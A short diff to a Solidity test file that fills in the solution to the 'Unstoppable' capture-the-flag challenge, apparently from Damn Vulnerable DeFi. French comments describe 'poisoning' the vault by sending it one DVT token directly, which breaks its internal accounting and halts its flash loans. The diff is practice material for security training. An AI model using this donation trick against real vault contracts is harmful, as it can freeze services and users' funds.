@@ -91,6 +91,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+        // On “empoisonne” la vault en lui transférant des DVT directement,
+        // sans passer par deposit/mint, ce qui désaligne la comptabilité interne.
+        token.transfer(address(vault), 1e18); // 1 DVT
         
     }
 
